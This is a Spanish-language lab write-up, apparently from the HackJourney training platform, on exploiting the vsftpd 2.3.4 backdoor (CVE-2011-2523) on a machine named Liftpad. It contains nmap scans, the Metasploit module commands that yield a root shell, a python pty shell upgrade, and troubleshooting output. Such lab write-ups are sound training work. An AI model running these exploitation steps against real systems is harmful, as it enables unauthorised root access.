# Informe de Explotación - Maquina: Liftpad

**Este write-up forma parte del laboratorio de HackJourney. Para más información, visita [www.hackjourney.com](https://www.hackjourney.com)**

## 1. Información General

* **Nombre de la máquina:** Liftpad (HackJourney)
* **Dirección IP:** Variable según reinicio (ej. 10.10.99.18, 10.10.52.177, 10.10.61.204)
* **VPN activa:** Tunel VPN por OpenVPN (tun1)

---

## 2. Descubrimiento del Servicio Vulnerable

### Escaneo inicial con Nmap:

```bash
sudo nmap -Pn -sS -sC -sV -oN nmap-inicial 10.10.99.18
```

**Resultado relevante:**

* **Puerto 21/tcp (FTP)** abierto
* Servicio: `vsftpd 2.3.4`
* Permite login anónimo (código 230)

---

## 3. Confirmación de vulnerabilidad con Nmap NSE

```bash
sudo nmap -Pn -p 21 --script "ftp-*" -oN nmap-ftp-scripts 10.10.99.18
```

**Resultado del script `ftp-vsftpd-backdoor`:**

* Estado: VULNERABLE (CVE-2011-2523)
* UID obtenido: `root`

---

## 4. Explotación con Metasploit

### Módulo usado:

```
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.10.61.204
run
```

**Resultado exitoso:**

```
[+] 10.10.61.204:21 - Backdoor service has been spawned, handling...
[+] 10.10.61.204:21 - UID: uid=0(root) gid=0(root) groups=0(root)
[*] Found shell.
[*] Command shell session opened
```

Shell mejorada con:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## 5. Acceso Root Verificado

Se confirmó acceso al sistema con privilegios de superusuario (`root`) en la máquina.

> Por políticas de HackJourney, no se muestran flags, contraseñas ni hashes en write-ups públicos.

---

## 6. Problemas encontrados

### a. Fallos de conexión intermitentes

* El exploit falló en varias ejecuciones con errores como:

```
Exploit failed [unreachable]: Rex::ConnectionTimeout
```

* O bien:

```
The service on port 6200 does not appear to be a shell
```

* A veces el puerto 6200 quedaba abierto, pero no ejecutaba correctamente el shell.

### b. Reinicio de entorno o caducidad de sesión

* La dirección IP del objetivo cambió varias veces (10.10.99.18, 10.10.52.177, 10.10.61.204), lo cual requiere repetir todo el proceso de explotación.

---

## 7. Conclusiones

* La máquina `Liftpad` es vulnerable a una explotación conocida y antigua en `vsftpd 2.3.4`.
* A pesar de errores de sesión y reconexión, se logró obtener una shell como `root`.
* Se recomienda no intentar levantar servicios como SSH permanentemente, ya que estas máquinas suelen reiniciar su estado.

---

## 8. Herramientas Utilizadas

* `nmap`
* `netcat`
* `msfconsole`
* `openvpn`
* `python3`
* `ps`, `ss`, `which`, etc.

---

## 9. Recomendaciones

* Automatizar la verificación de disponibilidad del puerto 21 y el acceso al backdoor (puerto 6200).
* Mantener logs de IPs activas durante las sesiones de laboratorio.
* Considerar usar `meterpreter` para sesiones más estables.
